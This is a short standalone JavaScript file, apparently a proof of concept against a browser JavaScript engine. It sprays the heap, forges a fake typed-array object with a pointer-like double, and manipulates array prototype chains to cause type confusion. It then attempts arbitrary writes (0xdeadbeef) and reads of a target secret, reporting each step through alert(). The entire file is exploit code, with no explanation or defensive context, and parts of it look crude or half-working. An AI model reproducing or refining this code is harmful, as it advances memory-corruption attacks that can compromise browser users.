const NUM_ITERATIONS = 10;
const SPRAY_SIZE = 100000;
const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
let ab = new ArrayBuffer(0x1000);
let x = {buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
let y = new Uint32Array(ab);
let TARGET = { secret: 0x12345678 };

// Heap Spray
let spray = new Array(SPRAY_SIZE).fill({ data: y });

function v7(v8, v9) {
    if (v4.length == 0) {
        v4[3] = y;
        alert('v4[3] set to y');
    }
    const v11 = v4.pop();
    try {
        v11[0] = 0xdeadbeef; 
        alert('Write to v11[0] succeeded with value: ' + v11[0].toString(16));
        v11[1] = TARGET; 
        let readValue = v11[0]; 
        alert('Read from v11[0] = ' + readValue.toString(16));
    } catch (e) {
        alert('Crash or Type Confusion: ' + e);
    }
    for (let v15 = 0; v15 < 100; v15++) {}
}

var p = {};
p.__proto__ = [y, y, y];
p[0] = x;
v4.__proto__ = p;

function main() {
    for (let v31 = 0; v31 < NUM_ITERATIONS; v31++) {
        v7();
    }
    alert('TARGET.secret = ' + TARGET.secret);
    alert('y[0] = ' + y[0].toString(16));
}

main();
